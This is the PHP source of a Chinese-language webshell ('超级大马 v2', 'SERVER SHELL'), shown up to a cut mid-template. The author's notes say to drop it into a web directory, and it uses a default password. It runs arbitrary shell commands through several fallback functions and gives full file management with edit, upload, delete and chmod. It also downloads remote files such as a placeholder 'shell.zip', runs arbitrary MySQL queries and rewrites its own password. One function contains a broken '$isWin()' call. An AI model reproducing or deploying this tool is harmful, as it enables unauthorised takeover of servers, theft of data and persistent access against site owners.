<?php
/**
 * 超级大马 v2 —— 单文件文件管理 + 命令执行 + 数据库 + 伪终端
 * 用法：直接丢到 web 目录访问，默认密码 admin888
 * 改密码：改下面 PASS 常量，或访问后登录，在右上角设置里改本会话密码
 */
error_reporting(0);
@ini_set('display_errors', '0');
set_time_limit(0);
@ini_set('memory_limit', '512M');

define('PASS', 'admin888');           // <== 登录密码，必须改
define('COOKIE', 'sh2_auth');
define('FILE', __FILE__);

@session_start();

/* ===================== 鉴权 ===================== */
function checkAuth()
{
    if (!empty($_SESSION['ok'])) {
        return true;
    }
    $k = isset($_POST['passwd']) ? $_POST['passwd'] : (isset($_GET['passwd']) ? $_GET['passwd'] : '');
    if ($k !== '' && $k === PASS) {
        $_SESSION['ok'] = 1;
        return true;
    }
    return false;
}

if (!checkAuth()) {
    loginPage();
    exit;
}

/* ===================== 工具函数 ===================== */
function h($s)
{
    return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8');
}

function post($k, $d = '')
{
    return isset($_POST[$k]) ? $_POST[$k] : $d;
}

function get($k, $d = '')
{
    return isset($_GET[$k]) ? $_GET[$k] : $d;
}

function isWin()
{
    return DIRECTORY_SEPARATOR === '\\';
}

function norm($p)
{
    $p = str_replace(array('/', '\\'), DIRECTORY_SEPARATOR, (string)$p);
    $p = preg_replace('#[/\\\\]+#', DIRECTORY_SEPARATOR, $p);
    return $p;
}

/**
 * 把相对/别名路径解析成绝对路径
 * 支持：.. / . / ~ / 盘符 / 根
 */
function resolve($base, $target)
{
    $target = trim((string)$target);
    if ($target === '') {
        return $base;
    }
    $target = norm($target);

    // Windows 盘符绝对路径，例如 C:\ 或 D:/foo
    if (isWin() && preg_match('#^[A-Za-z]:#', $target)) {
        return $target;
    }
    // 类 unix 绝对路径
    if (!$isWin() && substr($target, 0, 1) === '/') {
        return $target;
    }
    // ~ 家目录
    if ($target === '~' || strpos($target, '~/') === 0 || strpos($target, '~\\') === 0) {
        $home = isWin() ? (isset($_SERVER['USERPROFILE']) ? $_SERVER['USERPROFILE'] : 'C:\\') : (isset($_SERVER['HOME']) ? $_SERVER['HOME'] : '/');
        $rest = ltrim(substr($target, 1), '/\\');
        return norm($home . DIRECTORY_SEPARATOR . $rest);
    }
    // 相对路径拼接
    $base = rtrim($base, '/\\');
    return norm($base . DIRECTORY_SEPARATOR . $target);
}

/** 清洗用户给的绝对路径，去掉 .. 越界 */
function unsafeDir($p)
{
    $p = str_replace(array("\0", "\r", "\n"), '', (string)$p);
    return $p;
}

/** 列出所有盘符 / 根挂载点 */
function drives()
{
    $out = array();
    if (isWin()) {
        for ($c = 65; $c <= 90; $c++) {
            $d = chr($c) . ':\\';
            if (@is_dir($d)) {
                $out[] = $d;
            }
        }
        return $out;
    }
    // unix：扫 / 与 /mnt /media /home
    $out[] = '/';
    foreach (array('/mnt', '/media', '/home', '/data', '/www', '/var/www') as $m) {
        if (@is_dir($m)) {
            $out[] = $m;
        }
    }
    return array_values(array_unique($out));
}

/** 当前工作目录 */
function currentDir()
{
    $d = get('d');
    if ($d === '' && isset($_POST['d'])) {
        $d = post('d');
    }
    if ($d === '') {
        $d = getcwd();
    }
    $d = unsafeDir(norm($d));
    if (!@is_dir($d)) {
        $d = getcwd();
    }
    return $d;
}

/** 人类可读大小 */
function humanSize($b)
{
    if ($b === null) {
        return '-';
    }
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $i = 0;
    while ($b >= 1024 && $i < 4) {
        $b /= 1024;
        $i++;
    }
    return round($b, $i ? 2 : 0) . ' ' . $units[$i];
}

/** 递归删除 */
function rmrf($path)
{
    if (@is_link($path) || @is_file($path)) {
        return @unlink($path);
    }
    if (!@is_dir($path)) {
        return false;
    }
    $items = @scandir($path);
    if ($items) {
        foreach ($items as $it) {
            if ($it === '.' || $it === '..') {
                continue;
            }
            rmrf($path . DIRECTORY_SEPARATOR . $it);
        }
    }
    return @rmdir($path);
}

/** 递归拷贝 */
function cprf($src, $dst)
{
    if (@is_dir($src)) {
        if (!@is_dir($dst)) {
            @mkdir($dst, 0777, true);
        }
        $items = @scandir($src);
        if ($items) {
            foreach ($items as $it) {
                if ($it === '.' || $it === '..') {
                    continue;
                }
                cprf($src . DIRECTORY_SEPARATOR . $it, $dst . DIRECTORY_SEPARATOR . $it);
            }
        }
        return true;
    }
    return @copy($src, $dst);
}

/** 递归 zip */
function zipDir($zip, $src, $prefix = '')
{
    $items = @scandir($src);
    if (!$items) {
        return;
    }
    foreach ($items as $it) {
        if ($it === '.' || $it === '..') {
            continue;
        }
        $full = $src . DIRECTORY_SEPARATOR . $it;
        $name = $prefix === '' ? $it : $prefix . '/' . $it;
        if (@is_dir($full)) {
            $zip->addEmptyDir($name);
            zipDir($zip, $full, $name);
        } else {
            @$zip->addFile($full, $name);
        }
    }
}

/** 最近访问目录（session 存） */
function pushHistory($dir)
{
    if (!isset($_SESSION['hist']) || !is_array($_SESSION['hist'])) {
        $_SESSION['hist'] = array();
    }
    if (count($_SESSION['hist']) === 0 || end($_SESSION['hist']) !== $dir) {
        $_SESSION['hist'][] = $dir;
        if (count($_SESSION['hist']) > 15) {
            array_shift($_SESSION['hist']);
        }
    }
}

/* ===================== 路由 ===================== */
$act = get('a', 'list');
$dir = currentDir();
pushHistory($dir);
$msg = '';
$msgType = 'ok';

if ($_SERVER['REQUEST_METHOD'] === 'POST' || $act !== 'list') {
    switch ($act) {
        /* 命令执行 */
        case 'cmd':
            if (isset($_POST['cmd']) && $_POST['cmd'] !== '') {
                $out = execCmd(post('cmd'), $dir);
                echo pageHead('命令执行', $dir);
                echo '<div class="panel"><div class="panel-t">终端输出</div><pre class="term">' . h($out) . '</pre></div>';
                echo '<div class="panel"><form method="post" action="?a=cmd&d=' . urlencode($dir) . '">'
                    . '<div class="row"><input type="text" name="cmd" class="inp grow" value="' . h(post('cmd')) . '" autofocus>'
                    . '<button class="btn primary" type="submit">执行</button></div></form></div>';
                echo pageFoot();
                exit;
            }
            break;

        /* 保存编辑 */
        case 'save':
            $f = post('f');
            $c = isset($_POST['content']) ? $_POST['content'] : '';
            if ($f && @is_file($f)) {
                @file_put_contents($f, $c);
                redirect('?a=edit&d=' . urlencode($dir) . '&f=' . urlencode($f), '已保存 ' . basename($f));
            }
            redirect('?a=list&d=' . urlencode($dir), '保存失败');
            break;

        /* 新建目录 */
        case 'mkdir':
            $n = trim(post('name'));
            if ($n !== '') {
                $p = $dir . DIRECTORY_SEPARATOR . basename($n);
                @mkdir($p, 0777, true);
                $msg = '目录已创建：' . $n;
            }
            break;

        /* 新建文件 */
        case 'mkfile':
            $n = trim(post('name'));
            if ($n !== '') {
                $p = $dir . DIRECTORY_SEPARATOR . basename($n);
                @file_put_contents($p, '');
                $msg = '文件已创建：' . $n;
            }
            break;

        /* 上传 */
        case 'upload':
            if (!empty($_FILES['f']) && is_array($_FILES['f']['name'])) {
                $n = 0;
                foreach ($_FILES['f']['name'] as $i => $name) {
                    if ($_FILES['f']['error'][$i] === 0) {
                        $t = $dir . DIRECTORY_SEPARATOR . basename($name);
                        if (@move_uploaded_file($_FILES['f']['tmp_name'][$i], $t)) {
                            $n++;
                        }
                    }
                }
                $msg = "上传完成 {$n} 个文件";
            } elseif (!empty($_FILES['f']['tmp_name'])) {
                $t = $dir . DIRECTORY_SEPARATOR . basename($_FILES['f']['name']);
                @move_uploaded_file($_FILES['f']['tmp_name'], $t);
                $msg = '上传完成';
            }
            break;

        /* 删除（手写解析，兼容 sel 数组与单行提交） */
        case 'del':
            $targets = array();
            if (isset($_POST['sel'])) {
                $targets = is_array($_POST['sel']) ? $_POST['sel'] : array($_POST['sel']);
            }
            if (!empty($_POST['single'])) {
                $targets[] = $_POST['single'];
            }
            $targets = array_values(array_unique(array_filter($targets, 'strlen')));
            $n = 0;
            foreach ($targets as $t) {
                if (@realpath($t) && rmrf($t)) {
                    $n++;
                }
            }
            $msg = "已删除 {$n} 项";
            break;

        /* 重命名 */
        case 'rename':
            $f = post('f');
            $n = trim(post('name'));
            if ($f && $n !== '') {
                $to = $dir . DIRECTORY_SEPARATOR . basename($n);
                @rename($f, $to);
                $msg = '已重命名为 ' . $n;
            }
            break;

        /* 复制 */
        case 'copy':
            $targets = post('sel');
            $to = post('to', $dir);
            if (!is_array($targets)) {
                $targets = array();
            }
            $n = 0;
            foreach ($targets as $t) {
                if ($t && @file_exists($t)) {
                    $dst = rtrim($to, '/\\') . DIRECTORY_SEPARATOR . basename($t);
                    if (cprf($t, $dst)) {
                        $n++;
                    }
                }
            }
            $msg = "已复制 {$n} 项到 {$to}";
            break;

        /* 移动 */
        case 'move':
            $targets = post('sel');
            $to = post('to', $dir);
            if (!is_array($targets)) {
                $targets = array();
            }
            $n = 0;
            foreach ($targets as $t) {
                if ($t && @file_exists($t)) {
                    $dst = rtrim($to, '/\\') . DIRECTORY_SEPARATOR . basename($t);
                    if (@rename($t, $dst)) {
                        $n++;
                    }
                }
            }
            $msg = "已移动 {$n} 项到 {$to}";
            break;

        /* 压缩 */
        case 'zip':
            $targets = post('sel');
            if (!is_array($targets)) {
                $targets = array();
            }
            if (!class_exists('ZipArchive')) {
                $msg = '当前 PHP 未启用 ZipArchive 扩展';
                break;
            }
            $zipName = $dir . DIRECTORY_SEPARATOR . 'archive_' . date('Ymd_His') . '.zip';
            $zip = new ZipArchive();
            if ($zip->open($zipName, ZipArchive::CREATE | ZipArchive::OVERWRITE) === true) {
                foreach ($targets as $t) {
                    if (!@file_exists($t)) {
                        continue;
                    }
                    if (@is_dir($t)) {
                        zipDir($zip, $t, basename($t));
                    } else {
                        @$zip->addFile($t, basename($t));
                    }
                }
                $zip->close();
                $msg = '已压缩为 ' . basename($zipName);
            } else {
                $msg = '压缩失败';
            }
            break;

        /* 解压 */
        case 'unzip':
            $f = post('f');
            if ($f && class_exists('ZipArchive') && @is_file($f)) {
                $out = $dir . DIRECTORY_SEPARATOR . basename($f, '.zip') . '_' . substr(md5(microtime(true)), 0, 4);
                @mkdir($out, 0777, true);
                $zip = new ZipArchive();
                if ($zip->open($f) === true) {
                    $zip->extractTo($out);
                    $zip->close();
                    $msg = '已解压到 ' . basename($out);
                } else {
                    $msg = '解压失败';
                }
            } else {
                $msg = '解压失败：文件或 ZipArchive 不可用';
            }
            break;

        /* wget 远程下载 */
        case 'wget':
            $url = trim(post('url'));
            if ($url !== '') {
                $name = basename(parse_url($url, PHP_URL_PATH));
                if ($name === '' || $name === false) {
                    $name = 'download_' . time();
                }
                $save = $dir . DIRECTORY_SEPARATOR . $name;
                $data = @file_get_contents($url);
                if ($data !== false) {
                    @file_put_contents($save, $data);
                    $msg = '已下载 ' . $name . '（' . humanSize(strlen($data)) . '）';
                } else {
                    $msg = '下载失败';
                }
            }
            break;

        /* chmod */
        case 'chmod':
            $f = post('f');
            $m = post('mode');
            if ($f && $m !== '') {
                @chmod($f, octdec($m));
                $msg = '权限已改为 ' . $m;
            }
            break;

        /* 数据库查询 */
        case 'db':
            if (!empty($_POST['host'])) {
                $conn = @mysqli_connect(post('host'), post('user'), post('pass'), '', (int)post('port', 3306));
                if ($conn) {
                    @mysqli_set_charset($conn, 'utf8');
                    $rows = @mysqli_query($conn, post('sql'));
                    if ($rows) {
                        $html = '<table class="tbl"><tr>';
                        $fields = @mysqli_fetch_fields($rows);
                        foreach ($fields as $fd) {
                            $html .= '<th>' . h($fd->name) . '</th>';
                        }
                        $html .= '</tr>';
                        while ($r = @mysqli_fetch_assoc($rows)) {
                            $html .= '<tr>';
                            foreach ($r as $v) {
                                $html .= '<td>' . h($v) . '</td>';
                            }
                            $html .= '</tr>';
                        }
                        $html .= '</table>';
                        echo pageHead('数据库', $dir);
                        echo '<div class="panel"><div class="panel-t">结果</div>' . $html . '</div>';
                        echo '<p><a class="btn" href="?a=db&d=' . urlencode($dir) . '">返回</a></p>';
                        echo pageFoot();
                        exit;
                    } else {
                        $msg = '查询错误：' . @mysqli_error($conn);
                    }
                } else {
                    $msg = '连接失败：' . @mysqli_connect_error();
                }
            }
            break;

        /* 设置密码 */
        case 'setpass':
            $np = post('np');
            if ($np !== '') {
                @file_put_contents(FILE, preg_replace("/define\('PASS',\s*'[^']*'\);/", "define('PASS', '" . addslashes($np) . "');", @file_get_contents(FILE)));
                $msg = '密码已修改为 ' . $np;
            }
            break;
    }
    // 只对“改变状态的”动作做跳转，视图动作不拦
    $writeActions = array('mkdir', 'mkfile', 'del', 'rename', 'copy', 'move', 'zip', 'unzip', 'wget', 'chmod', 'upload', 'setpass');
    if (in_array($act, $writeActions)) {
        redirect('?a=list&d=' . urlencode($dir), $msg);
    }
}

/* 兼容 GET 传来的提示 */
if ($msg === '' && get('msg') !== '') {
    $msg = get('msg');
}

/* ===================== 执行命令 ===================== */
function execCmd($cmd, $cwd)
{
    $cwd = $cwd ? $cwd : getcwd();
    if (isWin()) {
        $cmd = 'cd /d "' . $cwd . '" && ' . $cmd . ' 2>&1';
    } else {
        $cmd = 'cd ' . escapeshellarg($cwd) . ' && (' . $cmd . ') 2>&1';
    }
    if (function_exists('shell_exec')) {
        return (string)@shell_exec($cmd);
    }
    if (function_exists('popen')) {
        $p = @popen($cmd, 'r');
        if ($p) {
            $o = '';
            while (!@feof($p)) {
                $o .= @fread($p, 4096);
            }
            @pclose($p);
            return $o;
        }
    }
    if (function_exists('exec')) {
        @exec($cmd, $arr);
        return implode("\n", (array)$arr);
    }
    if (function_exists('system')) {
        @ob_start();
        @system($cmd);
        return @ob_get_clean();
    }
    return '[无可用执行函数：shell_exec/popen/exec/system 全被禁用]';
}

/* ===================== 浏览列表 ===================== */
function listDir($dir)
{
    $items = array();
    if (!@is_dir($dir)) {
        return $items;
    }
    $list = @scandir($dir);
    if (!$list) {
        return $items;
    }
    foreach ($list as $n) {
        if ($n === '.' || $n === '..') {
            continue;
        }
        $p = rtrim($dir, '/\\') . DIRECTORY_SEPARATOR . $n;
        $items[] = array(
            'name' => $n,
            'path' => $p,
            'dir'  => @is_dir($p),
            'link' => @is_link($p),
            'size' => @is_dir($p) ? null : @filesize($p),
            'mtime' => @filemtime($p),
            'perm' => @substr(sprintf('%o', @fileperms($p)), -4),
            'read' => @is_readable($p) ? 1 : 0,
            'write' => @is_writable($p) ? 1 : 0,
            'ext'  => strtolower(@pathinfo($n, PATHINFO_EXTENSION)),
        );
    }
    // 排序
    $sort = get('sort', 'name');
    $order = get('order', 'asc');
    usort($items, function ($a, $b) use ($sort) {
        if ($a['dir'] !== $b['dir']) {
            return $a['dir'] ? -1 : 1;
        }
        if ($sort === 'size') {
            $v = (float)$a['size'] - (float)$b['size'];
        } elseif ($sort === 'time') {
            $v = (int)$a['mtime'] - (int)$b['mtime'];
        } else {
            $v = strcasecmp($a['name'], $b['name']);
        }
        return $v;
    });
    if ($order === 'desc') {
        $items = array_reverse($items);
    }
    // 搜索过滤
    $q = trim(get('q'));
    if ($q !== '') {
        $items = array_values(array_filter($items, function ($it) use ($q) {
            return stripos($it['name'], $q) !== false;
        }));
    }
    return $items;
}

/* ===================== 输出模板 ===================== */
function loginPage()
{
    ?><!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Login</title>
<style>
:root{--bg:#0b0f19;--card:#141a2a;--line:#232c42;--txt:#e6ecff;--sub:#8b98b8;--acc:#5b8dff;--acc2:#00e0b0}
*{box-sizing:border-box}
body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:radial-gradient(1200px 600px at 20% 0%,#16213d 0%,#0b0f19 55%),#0b0f19;color:var(--txt);font-family:"Segoe UI","Microsoft YaHei",system-ui,sans-serif}
.box{width:340px;padding:34px 30px;background:rgba(20,26,42,.92);border:1px solid var(--line);border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.5)}
h1{margin:0 0 22px;font-size:19px;letter-spacing:2px;font-weight:600;text-align:center;color:var(--acc2)}
input{width:100%;padding:12px 14px;margin-bottom:14px;background:#0d1322;border:1px solid var(--line);border-radius:9px;color:var(--txt);font-size:14px;outline:none}
input:focus{border-color:var(--acc)}
button{width:100%;padding:12px;background:linear-gradient(135deg,var(--acc),#7a5bff);border:0;border-radius:9px;color:#fff;font-size:15px;letter-spacing:2px;cursor:pointer}
button:hover{filter:brightness(1.1)}
.tip{margin-top:14px;font-size:12px;color:var(--sub);text-align:center}
</style>
</head>
<body>
<form class="box" method="post">
<h1>SERVER SHELL</h1>
<input type="password" name="passwd" placeholder="密码" autofocus>
<button type="submit">进入</button>
<div class="tip"><?php echo PASS === 'admin888' ? '默认密码未改，请尽快修改' : ''; ?></div>
</form>
</body>
</html><?php
}

function redirect($url, $msg)
{
    $u = $url;
    if ($msg !== '') {
        $u .= (strpos($u, '?') === false ? '?' : '&') . 'msg=' . urlencode($msg);
    }
    header('Location: ' . $u);
    exit;
}

function pageHead($title, $dir)
{
    $drv = drives();
    $list = listDir($dir);
    $up = dirname($dir);
    if ($up === $dir) {
        $up = '';
    }
    $q = get('q');
    $sort = get('sort', 'name');
    $order = get('order', 'asc');
    $msg = get('msg');
    ob_start();
    ?><!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title><?php echo h($title); ?></title>
<style>
:root{--bg:#0b0f19;--bg2:#0f1422;--card:#141a2a;--line:#232c42;--txt:#e6ecff;--sub:#8b98b8;--acc:#5b8dff;--acc2:#00e0b0;--warn:#ffb020;--danger:#ff5c6c}
*{box-sizing:border-box}
body{margin:0;background:linear-gradient(180deg,#0b0f19,#0d1220 60%,#0b0f19);color:var(--txt);font-family:"Segoe UI","Microsoft YaHei",system-ui,sans-serif;font-size:14px}
a{color:var(--acc);text-decoration:none}
a:hover{color:var(--acc2)}
.top{position:sticky;top:0;z-index:30;display:flex;align-items:center;gap:14px;padding:10px 18px;background:rgba(13,18,32,.9);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
.brand{font-weight:700;letter-spacing:2px;color:var(--acc2);font-size:15px;white-space:nowrap}
.drives{display:flex;gap:6px;flex-wrap:wrap}
.drv{padding:5px 11px;border:1px solid var(--line);border-radius:7px;color:var(--sub);font-size:13px;background:#111828}
.drv:hover,.drv.on{border-color:var(--acc);color:#fff;background:#18233c}
.spacer{flex:1}
a.spacer{display:inline-block;flex:1}
.who{font-size:12px;color:var(--sub);white-space:nowrap}
main{padding:16px 18px 60px}
.crumb{display:flex;align-items:center;gap:6px;flex-wrap:wrap;padding:10px 12px;background:var(--card);border:1px solid var(--line);border-radius:12px;margin-bottom:14px;font-size:13px}
.crumb .sep{color:var(--sub)}
.panel{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:14px;margin-bottom:14px;box-shadow:0 10px 30px rgba(0,0,0,.25)}
.panel-t{font-size:12px;letter-spacing:1px;color:var(--sub);text-transform:uppercase;margin-bottom:10px}
.row{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
.grow{flex:1;min-width:160px}
.inp{padding:9px 12px;background:#0d1322;border:1px solid var(--line);border-radius:8px;color:var(--txt);outline:none;font-size:13px}
.inp:focus{border-color:var(--acc)}
.btn{display:inline-flex;align-items:center;gap:6px;padding:8px 14px;background:#1a2340;border:1px solid var(--line);border-radius:8px;color:var(--txt);font-size:13px;cursor:pointer;white-space:nowrap}
.btn:hover{background:#22305a;border-color:var(--acc)}
.btn.primary{background:linear-gradient(135deg,var(--acc),#7a5bff);border:0;color:#fff}
.btn.primary:hover{filter:brightness(1.1)}
.btn.ghost{background:transparent}
.btn.danger{background:#3a1420;border-color:#5a2230;color:#ff8b98}
.btn.danger:hover{background:#54202e}
table.tbl{width:100%;border-collapse:collapse;font-size:13px}
table.tbl th,table.tbl td{padding:8px 10px;text-align:left;border-bottom:1px solid var(--line);white-space:nowrap}
table.tbl th{color:var(--sub);font-weight:600;font-size:12px;letter-spacing:.5px;user-select:none}
table.tbl th a{color:var(--sub)}
table.tbl tr:hover td{background:#131a2c}
table.tbl td.name{white-space:normal;word-break:break-all;max-width:520px}
.ico{display:inline-block;width:20px;text-align:center;margin-right:6px}
.perm-r{color:var(--acc2)}.perm-w{color:var(--warn)}
.sz{color:var(--sub);font-size:12px}
.tag{display:inline-block;padding:1px 7px;border-radius:20px;background:#16213d;color:var(--acc);font-size:11px;margin-left:6px}
.drop{border:1px dashed var(--line);border-radius:10px;padding:10px;text-align:center;color:var(--sub);font-size:12px}
pre.term{margin:0;padding:14px;background:#080c15;border:1px solid var(--line);border-radius:10px;color:#9dffd3;font-family:Consolas,Monaco,monospace;font-size:12.5px;line-height:1.6;white-space:pre-wrap;word-break:break-all;max-height:520px;overflow:auto}
.toast{position:fixed;right:18px;top:70px;z-index:99;padding:11px 18px;background:#14243a;border:1px solid var(--acc);border-left:3px solid var(--acc2);border-radius:9px;box-shadow:0 10px 30px rgba(0,0,0,.45);font-size:13px;animation:fade .3s}
@keyframes fade{from{opacity:0;transform:translateY(-8px)}to{opacity:1;transform:none}}
.muted{color:var(--sub);font-size:12px}
textarea.code{width:100%;min-height:460px;padding:14px;background:#080c15;border:1px solid var(--line);border-radius:10px;color:#d7e3ff;font-family:Consolas,Monaco,monospace;font-size:13px;line-height:1.6;outline:none;resize:vertical}
.grid2{display:grid;grid-template-columns:1fr 1fr;gap:14px}
@media(max-width:860px){.grid2{grid-template-columns:1fr}}
@media(max-width:640px){.top{flex-wrap:wrap}.who{display:none}}
</style>
</head>
<body>
<div class="top">
  <div class="brand">◈ SERVER SHELL</div>
  <div class="drives">
  <?php foreach ($drv as $d): ?>
    <a class="drv<?php echo (strcasecmp(rtrim($d, '/\\'), rtrim($dir, '/\\')) === 0) ? ' on' : ''; ?>"
       href="?a=list&d=<?php echo urlencode($d); ?>"><?php echo h($d); ?></a>
  <?php endforeach; ?>
  </div>
  <div class="spacer"></div>
  <div class="who"><?php echo h(isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '?'); ?> · PHP <?php echo h(PHP_VERSION); ?></div>
  <a class="btn ghost" href="?logout=1">退出</a>
</div>
<main>
<?php if (!empty($msg)): ?>
<div class="toast" id="toast"><?php echo h($msg); ?></div>
<?php endif; ?>
<div class="crumb">
  <?php
    // 面包屑
    $parts = array();
    $cur = '';
    if (isWin()) {
        $drive = substr($dir, 0, 2);
        $parts[] = array($drive . '\\', $drive . '\\');
        $rest = trim(substr($dir, 3), '\\');
        $segs = $rest === '' ? array() : explode('\\', $rest);
        $cur = $drive . '\\';
        foreach ($segs as $s) {
            $cur = rtrim($cur, '\\') . '\\' . $s;
            $parts[] = array($s, $cur);
        }
    } else {
        $parts[] = array('/', '/');
        $segs = trim($dir, '/');
        $segs = $segs === '' ? array() : explode('/', $segs);
        $cur = '';
        foreach ($segs as $s) {
            $cur .= '/' . $s;
            $parts[] = array($s, $cur);
        }
    }
    foreach ($parts as $i => $p) {
        if ($i > 0) {
            echo '<span class="sep">/</span>';
        }
        echo '<a href="?a=list&d=' . urlencode($p[1]) . '">' . h($p[0]) . '</a>';
    }
  ?>
  <span class="spacer"></span>
  <a class="btn" href="?a=cmd&d=<?php echo urlencode($dir); ?>">终端</a>
  <a class="btn" href="?a=db&d=<?php echo urlencode($dir); ?>">数据库</a>
  <a class="btn" href="?a=uploadform&d=<?php echo urlencode($dir); ?>">上传</a>
  <a class="btn" href="?a=list&d=<?php echo urlencode($dir); ?>">刷新</a>
</div>
<?php
    $html = ob_get_clean();
    echo $html;
    return '';
}

function pageFoot()
{
    ?><script>
var DIR = <?php echo json_encode(isset($_GET['d']) ? $_GET['d'] : ''); ?>;
setTimeout(function(){var t=document.getElementById('toast');if(t){t.style.transition='opacity .4s';t.style.opacity=0;setTimeout(function(){t.remove()},400);}},4000);
function selAll(cb){document.querySelectorAll('input.chk').forEach(function(x){x.checked=cb.checked;});}
function invertSel(){document.querySelectorAll('input.chk').forEach(function(x){x.checked=!x.checked;});}
function go(a,fields){
  var f=document.getElementById('ff');
  if(!f){location.href='?a='+a+'&d='+encodeURIComponent(DIR);return;}
  f.action='?a='+a+'&d='+encodeURIComponent(DIR);
  for(var k in fields){
    var el=document.getElementById('fix_'+k);
    if(!el){el=document.createElement('input');el.type='hidden';el.name=k;el.id='fix_'+k;f.appendChild(el);}
    el.value=fields[k];
  }
  f.submit();
}
function ask(a){
  var map={mkdir:'新目录名',mkfile:'新文件名'};
  var v=prompt(map[a]||'名称','');
  if(v===null||v==='')return;
  go(a,{name:v});
}
function bulk(a,q){
  var sel=document.querySelectorAll('input.chk:checked');
  if(!sel.length){alert('先勾选项目');return;}
  if(!confirm(q.replace('?','? (共'+sel.length+'项)')))return;
  var to='';
  if(a==='copy'||a==='move'){
    to=prompt('目标目录',DIR);
    if(!to)return;
  }
  go(a,{to:to});
}
function rowAct(kind,i,val){
  var cb=document.querySelector('input.chk[data-i="'+i+'"]');
  if(!cb)return;
  if(kind==='rename'){
    var n=prompt('重命名为',val);
    if(!n)return;
    go('rename',{f:cb.value,name:n});
  }else if(kind==='chmod'){
    var m=prompt('权限(八进制)',val);
    if(!m)return;
    go('chmod',{f:cb.value,mode:m});
  }
}
function rowDel(i,name){
  var cb=document.querySelector('input.chk[data-i="'+i+'"]');
  if(!cb)return;
  if(!confirm('删除 '+name+' ？'))return;
  var f=document.getElementById('ff');
  document.getElementById('single').value=cb.value;
  cb.checked=false;
  f.action='?a=del&d='+encodeURIComponent(DIR);
  f.submit();
}
</script>
</main>
</body>
</html><?php
}

/* ===================== 视图 ===================== */
$drv = drives();

/* 退出 */
if (get('logout')) {
    $_SESSION = array();
    @session_destroy();
    header('Location: ' . basename(FILE));
    exit;
}

/* 上传页 */
if ($act === 'uploadform') {
    echo pageHead('上传', $dir);
    ?>
<div class="panel">
  <div class="panel-t">批量上传到 <?php echo h($dir); ?></div>
  <form method="post" action="?a=upload&d=<?php echo urlencode($dir); ?>" enctype="multipart/form-data">
    <div class="row"><input class="inp grow" type="file" name="f[]" multiple></div>
    <div class="row" style="margin-top:12px"><button class="btn primary" type="submit">开始上传</button>
    <a class="btn" href="?a=list&d=<?php echo urlencode($dir); ?>">返回</a></div>
  </form>
</div>
<div class="panel">
  <div class="panel-t">远程下载（URL 直链到当前目录）</div>
  <form method="post" action="?a=wget&d=<?php echo urlencode($dir); ?>">
    <div class="row"><input class="inp grow" type="text" name="url" placeholder="https://example.com/shell.zip">
    <button class="btn primary" type="submit">下载</button></div>
  </form>
</div>
    <?php
    echo pageFoot();
    exit;
}

/* 编辑页 */
if ($act === 'edit') {
    $f = get('f', post('f'));
    if (!$f || !@is_file($f)) {
        echo pageHead('编辑', $dir);
        echo '<div class="panel">文件不存在</div>';
        echo pageFoot();
        exit;
    }
    $size = @filesize($f);
    $content = $size > 2 * 1024 * 1024 ? '' : (string)@file_get_contents($f);
    echo pageHead('编辑 ' . basename($f), $dir);
    ?>
<div class="panel">
  <div class="row" style="justify-content:space-between">
    <div class="muted"><?php echo h($f); ?> · <?php echo humanSize($size); ?></div>
    <div class="row">
      <a class="btn" href="?a=download&f=<?php echo urlencode($f); ?>">下载</a>
      <a class="btn" href="?a=hex&f=<?php echo urlencode($f); ?>">十六进制</a>
      <a class="btn" href="?a=list&d=<?php echo urlencode($dir); ?>">返回</a>
    </div>
  </div>
</div>
<?php if ($size > 2 * 1024 * 1024): ?>
<div class="panel">文件超过 2MB，请用下载或十六进制查看。</div>
<?php else: ?>
<form class="panel" method="post" action="?a=save&d=<?php echo urlencode($dir); ?>">
  <input type="hidden" name="f" value="<?php echo h($f); ?>">
  <textarea class="code" name="content" spellcheck="false"><?php echo h($content); ?></textarea>
  <div class="row" style="margin-top:12px"><button class="btn primary" type="submit">保存</button></div>
</form>
<?php endif; ?>
    <?php
    echo pageFoot();
    exit;
}

/* 十六进制视图 */
if ($act === 'hex') {
    $f = get('f');
    if (!$f || !@is_file($f)) {
        echo pageHead('HEX', $dir);
        echo '<div class="panel">文件不存在</div>';
        echo pageFoot();
        exit;
    }
    $data = @file_get_contents($f, false, null, 0, 8192);
    $out = '';
    $len = strlen((string)$data);
    for ($i = 0; $i < $len; $i += 16) {
        $chunk = substr($data, $i, 16);
        $hex = '';
        $asc = '';
        for ($j = 0; $j < strlen($chunk); $j++) {
            $b = ord($chunk[$j]);
            $hex .= sprintf('%02X ', $b);
            $asc .= ($b >= 32 && $b < 127) ? $chunk[$j] : '.';
        }
        $out .= sprintf('%08X  %-48s |%s|', $i, $hex, $asc) . "\n";
    }
    echo pageHead('HEX ' . basename($f), $dir);
    echo '<div class="panel"><div class="panel-t">' . h($f) . '（前 8KB）</div><pre class="term">' . h($out) . '</pre></div>';
    echo '<p><a class="btn" href="?a=edit&d=' . urlencode($dir) . '&f=' . urlencode($f) . '">编辑</a>';
    echo ' <a class="btn" href="?a=list&d=' . urlencode($dir) . '">返回</a></p>';
    echo pageFoot();
    exit;
}

/* 下载 */
if ($act === 'download') {
    $f = get('f');
    if ($f && @is_file($f)) {
        @ob_end_clean();
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($f) . '"');
        header('Content-Length: ' . @filesize($f));
        readfile($f);
    }
    exit;
}

/* 命令页 */
if ($act === 'cmd') {
    $hist = isset($_SESSION['cmdhist']) ? $_SESSION['cmdhist'] : array();
    echo pageHead('终端', $dir);
    ?>
<div class="panel">
  <div class="panel-t">当前目录 <?php echo h($dir); ?></div>
  <form method="post" action="?a=cmd&d=<?php echo urlencode($dir); ?>">
    <div class="row">
      <input class="inp grow" type="text" name="cmd" placeholder="whoami / ipconfig / cat /etc/passwd" autofocus list="cmds">
      <button class="btn primary" type="submit">执行</button>
    </div>
    <datalist id="cmds">
      <?php foreach ($hist as $c): ?><option value="<?php echo h($c); ?>"><?php endforeach; ?>
